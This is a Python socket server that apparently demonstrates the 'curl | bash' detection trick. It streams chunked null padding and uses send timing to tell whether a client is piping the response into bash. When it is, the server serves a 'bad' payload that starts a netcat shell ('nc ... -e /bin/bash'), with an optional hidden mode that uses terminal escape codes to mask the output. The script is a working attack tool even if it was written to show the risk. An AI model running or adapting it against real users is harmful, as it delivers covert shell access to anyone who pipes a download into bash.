import socket
from time import time
from argparse import ArgumentParser

SEND_BUFFER_SIZE = 87380
NULL_CHUNK = chr(0) * SEND_BUFFER_SIZE
MAX_CHUNKS = 64

MIN_JUMP = 1
SLEEP = 2

HEADER = f'HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n'

PAYLOAD = {
    'default_hidden': f'sleep {SLEEP}\n(true || echo -en "\033[1B\r\033[K\033[1A\r\033[K"); echo -en "\r\033[K"\b \b',
    'default_verbose': f'sleep {SLEEP}\n',
    'default': '',

    'good': 'No curl | bash detected',

    'bad_verbose': 'echo "Oops, curl | bash detected!" && nc localhost 4444 -e /bin/bash 2>/dev/null &',
    'bad_hidden': '"Oops, curl | bash detected!" && nc localhost 4444 -e /bin/bash 2>/dev/null &',
    'bad': ''
}


def setup_arg_parser() -> ArgumentParser:
    parser = ArgumentParser()
    parser.add_argument('-o', '--host', type=str, default='0.0.0.0')
    parser.add_argument('-p', '--port', type=int, default=8000)
    parser.add_argument('--hidden', action='store_true')

    return parser


def setup_socket_server(host: str, port: int) -> socket:
    socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    socket_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    socket_server.bind((host, port))
    socket_server.listen()

    print(f'Listening on {host}:{port}')

    return socket_server


def setup_payloads(hidden: bool)-> None:
    if hidden:
        PAYLOAD['default'] = PAYLOAD['default_hidden']
        PAYLOAD['bad'] = PAYLOAD['bad_hidden']
        print('Using hidden payloads')
    else:
        PAYLOAD['default'] = PAYLOAD['default_verbose']
        PAYLOAD['bad'] = PAYLOAD['bad_verbose']
        print('Using verbose payloads')


def send_chunk(chunk: str, connection: socket) -> None:
    connection.sendall(f"{hex(len(chunk))[2:]}\r\n".encode('ascii'))
    connection.sendall(chunk.encode('ascii'))
    connection.sendall("\r\n".encode('ascii'))


def handle(client: socket, request: str) -> None:
    print('='*20)
    print('Request: ')
    print(request)

    client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    client.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SEND_BUFFER_SIZE)

    client.sendall(HEADER.encode('ascii'))
    send_chunk(PAYLOAD['default'], client)

    for _ in range(0, MAX_CHUNKS):
        start = time()
        send_chunk(NULL_CHUNK, client)
        if time() - start > MIN_JUMP:
            print('Bash detected')
            send_chunk(PAYLOAD['bad'], client)
            break
    else:
        print('No bash detected')
        send_chunk(PAYLOAD['good'], client)

    send_chunk('', client)


def main(host: str, port: int, hidden: bool) -> None:
    setup_payloads(hidden)
    socket_server = setup_socket_server(host, port)

    while True:
        try:
            client_connection, _ = socket_server.accept()
            request = client_connection.recv(1024).decode('ascii')
            handle(client_connection, request)
            client_connection.close()
        except KeyboardInterrupt:
            socket_server.close()
            return


if __name__ == '__main__':
    args = setup_arg_parser().parse_args()
    main(args.host, args.port, args.hidden)
